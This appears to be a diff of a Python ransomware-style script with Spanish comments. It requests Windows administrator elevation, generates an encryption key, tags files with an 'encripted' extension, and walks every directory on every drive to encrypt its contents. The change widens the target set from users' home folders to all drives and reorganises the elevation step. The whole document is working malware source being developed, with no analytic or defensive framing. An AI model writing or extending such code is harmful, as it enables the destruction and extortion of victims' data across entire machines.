@@ -12,16 +12,14 @@ import ctypes
 def run_as_admin():
     try:
         # Solicita permisos de administrador
-        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
+        ans = ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
+        return ans
+        
     except Exception as e:
         print(f"Error al solicitar permisos de administrador: {e}")
-        sys.exit(1)
+        return False
 
-if ctypes.windll.shell32.IsUserAnAdmin():
-    pass
-else:
-    print("Este programa requiere permisos de administrador. Solicitando elevación...")
-    run_as_admin()
+
 
 
 extension = 'encripted'
@@ -65,20 +63,29 @@ def find_drives():
             L.add(drive.upper()+":\\")
     return L
 
+def listar_dirs(rute):
+    for root, dirs, files in os.walk(rute):
+        for directorio in dirs:
+            yield os.path.join(root, directorio)
 
 
-def get_users():
-    return {psutil.users()[i][0] for i in range(len(psutil.users()))}
-users = get_users()
+
+
 
 if __name__ == '__main__':
-
+    if ctypes.windll.shell32.IsUserAnAdmin():
+        pass
+    else:
+        print("Este programa requiere permisos de administrador. Solicitando elevación...")
+        if run_as_admin() == 42:
+            print("Permisos de administrador concedidos.")
+            sys.exit()
     try:
         # Directorio que vamos a cifrar.
-        for user in users:
-            directories = {'C:\\Users\\'+user+"\\" for user in users}
+        directories = set()
+        for drive in find_drives():
+            directories.update(listar_dirs(drive))
         
-        directories.update(find_drives())
 
         # Generación la clave de cifrado y se almacena en una variable.
         generar_key()
@@ -86,6 +93,7 @@ if __name__ == '__main__':
 
         while directories:
             path = directories.pop()
+            print(path)
             try:
                 print(f'Intentando acceder a {path}')
                 os.chdir(path)
